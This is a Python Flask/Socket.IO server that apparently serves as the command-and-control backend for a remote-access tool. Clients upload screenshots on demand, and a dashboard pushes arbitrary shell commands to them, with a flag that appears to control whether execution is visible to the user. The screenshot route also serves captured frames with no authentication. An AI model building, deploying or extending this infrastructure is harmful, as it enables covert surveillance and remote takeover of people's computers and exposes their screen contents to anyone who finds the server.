import os
import re
import shutil
import sqlite3
import base64
from contextlib import contextmanager
from functools import wraps

from flask import Flask, render_template, request, jsonify, send_from_directory
from flask_socketio import SocketIO, join_room
from dotenv import load_dotenv

load_dotenv()

app = Flask(__name__)
socketio = SocketIO(app, cors_allowed_origins="*", async_mode="threading")

DASHBOARD_PASSWORD = os.getenv("DASHBOARD_PASSWORD")
if not DASHBOARD_PASSWORD:
    raise RuntimeError("DASHBOARD_PASSWORD is not set")

SCREENSHOT_DIR = "uploaded_frames"
os.makedirs(SCREENSHOT_DIR, exist_ok=True)

SAFE_NAME_RE = re.compile(r"^[a-zA-Z0-9_\-\.]+$")


def is_safe_name(name: str) -> bool:
    """Validate that a username or filename does not contain path traversal characters."""
    if not name or not isinstance(name, str):
        return False
    if ".." in name or "/" in name or "\\" in name:
        return False
    return bool(SAFE_NAME_RE.match(name))


@contextmanager
def get_db():
    """Context manager for thread-safe SQLite operations with automatic commit and rollback."""
    conn = sqlite3.connect("database.db")
    conn.row_factory = sqlite3.Row
    try:
        yield conn
        conn.commit()
    except Exception:
        conn.rollback()
        raise
    finally:
        conn.close()


def require_password(f):
    @wraps(f)
    def wrapper(*args, **kwargs):
        password = request.headers.get("x-password")
        if not password or password != DASHBOARD_PASSWORD:
            return jsonify({"detail": "Unauthorized"}), 401
        return f(*args, **kwargs)

    return wrapper


def init_db():
    """Initialize database tables with WAL mode for concurrent access."""
    with get_db() as conn:
        conn.execute("PRAGMA journal_mode=WAL;")
        conn.execute(
            """
            CREATE TABLE IF NOT EXISTS clients (
                username TEXT PRIMARY KEY,
                visible INTEGER DEFAULT 1,
                capture INTEGER DEFAULT 0,
                version TEXT,
                updated_at TEXT
            )
            """
        )


init_db()


# ── WebSockets Handlers ──

active_clients = {}
authenticated_sids = set()


@socketio.on("register_dashboard")
def handle_register_dashboard(data):
    if not isinstance(data, dict):
        return
    password = data.get("password")
    if not password or password != DASHBOARD_PASSWORD:
        return
    join_room("dashboard")


@socketio.on("register")
def handle_register(data):
    if not isinstance(data, dict):
        return
    username = data.get("username")
    auth_token = data.get("auth_token")
    version = data.get("version", "")

    if not auth_token or auth_token != DASHBOARD_PASSWORD:
        print(
            f"[WebSocket Auth] Rejecting unauthenticated socket connection for username='{username}' sid='{request.sid}'"
        )
        socketio.disconnect(request.sid)
        return

    if not username or not is_safe_name(username):
        return

    authenticated_sids.add(request.sid)
    active_clients[request.sid] = username
    join_room(username)

    capture_val = False
    with get_db() as conn:
        cursor = conn.cursor()
        row = cursor.execute(
            "SELECT capture FROM clients WHERE username = ?", (username,)
        ).fetchone()
        if row:
            cursor.execute(
                "UPDATE clients SET updated_at = datetime('now'), version = ? WHERE username = ?",
                (version, username),
            )
            capture_val = bool(row["capture"])
        else:
            cursor.execute(
                "INSERT INTO clients (username, version, updated_at) VALUES (?, ?, datetime('now'))",
                (username, version),
            )
            capture_val = False

    socketio.emit("set_capture", {"capture": capture_val}, room=username)
    socketio.emit(
        "status_change",
        {"username": username, "online": True, "version": version},
        room="dashboard",
    )


@socketio.on("disconnect")
def handle_disconnect():
    authenticated_sids.discard(request.sid)
    username = active_clients.pop(request.sid, None)
    if username and username not in active_clients.values():
        socketio.emit(
            "status_change", {"username": username, "online": False}, room="dashboard"
        )


@socketio.on("heartbeat")
def handle_heartbeat(data):
    if request.sid not in authenticated_sids or not isinstance(data, dict):
        return
    username = data.get("username")
    if not username or active_clients.get(request.sid) != username:
        return

    with get_db() as conn:
        conn.execute(
            "UPDATE clients SET updated_at = datetime('now') WHERE username = ?",
            (username,),
        )


@socketio.on("upload_frame")
def handle_upload_frame(data):
    if request.sid not in authenticated_sids or not isinstance(data, dict):
        return
    username = data.get("username")
    if not username or active_clients.get(request.sid) != username:
        return
    filename = data.get("filename")
    image_base64 = data.get("image")

    if not filename or not image_base64 or not is_safe_name(username) or not is_safe_name(filename):
        return

    client_folder = os.path.join(SCREENSHOT_DIR, username)
    os.makedirs(client_folder, exist_ok=True)
    file_path = os.path.join(client_folder, filename)

    try:
        raw_b64 = image_base64
        if "," in raw_b64:
            raw_b64 = raw_b64.split(",", 1)[1]
        image_bytes = base64.b64decode(raw_b64)
        with open(file_path, "wb") as f:
            f.write(image_bytes)

        socketio.emit(
            "new_frame", {"username": username, "filename": filename}, room="dashboard"
        )
    except Exception as e:
        print(f"[Upload Frame Error] {e}")


# ── REST API Routes ──


@app.route("/")
def index():
    return render_template("index.html")


@app.get("/api/clients")
@require_password
def get_clients():
    with get_db() as conn:
        rows = conn.execute(
            """
            SELECT username, updated_at, visible, capture, version
            FROM clients
            ORDER BY updated_at DESC
            """
        ).fetchall()

    online_usernames = set(active_clients.values())

    return jsonify(
        [
            {
                "username": row["username"],
                "updated_at": row["updated_at"],
                "visible": row["visible"] if row["visible"] is not None else 1,
                "capture": bool(row["capture"]) if row["capture"] is not None else False,
                "version": row["version"] if row["version"] is not None else "",
                "online": row["username"] in online_usernames,
            }
            for row in rows
        ]
    )


@app.get("/api/frames/<username>")
@require_password
def get_frames(username):
    if not is_safe_name(username):
        return jsonify({"detail": "Invalid username"}), 400

    user_dir = os.path.join(SCREENSHOT_DIR, username)
    if not os.path.exists(user_dir):
        return jsonify([])

    files = sorted(
        [
            f
            for f in os.listdir(user_dir)
            if f.lower().endswith((".png", ".jpg", ".jpeg"))
        ],
        key=lambda f: int("".join(filter(str.isdigit, f)) or "0"),
    )

    return jsonify(files)


@app.post("/api/frames/delete")
@require_password
def delete_frames():
    data = request.get_json(silent=True) or {}
    username = data.get("username")

    if not username or not is_safe_name(username):
        return jsonify({"status": "error", "message": "Missing or invalid username"}), 400

    user_dir = os.path.join(SCREENSHOT_DIR, username)
    if os.path.exists(user_dir):
        try:
            shutil.rmtree(user_dir)
            os.makedirs(user_dir, exist_ok=True)
        except Exception as e:
            return jsonify({"status": "error", "message": str(e)}), 500

    return jsonify({"status": "success"})


@app.post("/api/capture")
@require_password
def set_capture():
    data = request.get_json(silent=True) or {}
    username = data.get("username")
    capture = data.get("capture")

    if not username or not is_safe_name(username):
        return jsonify({"status": "error", "message": "Missing or invalid username"}), 400

    if capture is None:
        return jsonify({"status": "error", "message": "Missing capture flag"}), 400

    with get_db() as conn:
        conn.execute(
            """
            INSERT INTO clients (username, capture)
            VALUES (?, ?)
            ON CONFLICT(username) DO UPDATE SET
                capture = excluded.capture
            """,
            (username, 1 if capture else 0),
        )

    socketio.emit("set_capture", {"capture": bool(capture)}, room=username)
    return jsonify({"status": "success"})


def _upsert_client_visibility(username: str, visible: int):
    with get_db() as conn:
        conn.execute(
            """
            INSERT INTO clients (username, visible)
            VALUES (?, ?)
            ON CONFLICT(username) DO UPDATE SET
                visible = excluded.visible
            """,
            (username, visible),
        )


@app.post("/api/visibility")
@require_password
def set_visibility():
    data = request.get_json(silent=True) or {}
    username = data.get("username")
    visible = data.get("visible")

    if not username or not is_safe_name(username):
        return jsonify({"status": "error", "message": "Missing or invalid username"}), 400

    if visible is None:
        return jsonify({"status": "error", "message": "Missing visible flag"}), 400

    _upsert_client_visibility(username, visible)
    return jsonify({"status": "success"})


@app.post("/api/command")
@require_password
def set_command():
    data = request.get_json(silent=True) or {}
    username = data.get("username")
    cmd = data.get("cmd")
    visible = data.get("visible", 1)

    if not username or not is_safe_name(username):
        return jsonify({"status": "error", "message": "Missing or invalid username"}), 400

    if cmd is None:
        return jsonify({"status": "error", "message": "Missing cmd string"}), 400

    _upsert_client_visibility(username, visible)

    # Instant WebSocket push command to client!
    socketio.emit("exec_command", {"cmd": cmd, "visible": visible}, room=username)

    return jsonify({"status": "success", "message": "Command sent over WebSocket"})


@app.get("/frames/<username>/<filename>")
def get_frame(username, filename):
    if not is_safe_name(username) or not is_safe_name(filename):
        return jsonify({"detail": "Invalid path"}), 400

    user_dir = os.path.join(SCREENSHOT_DIR, username)
    response = send_from_directory(user_dir, filename)
    response.headers["Cache-Control"] = "public, max-age=31536000, immutable"
    return response


if __name__ == "__main__":
    socketio.run(app, host="0.0.0.0", port=5002, debug=False)
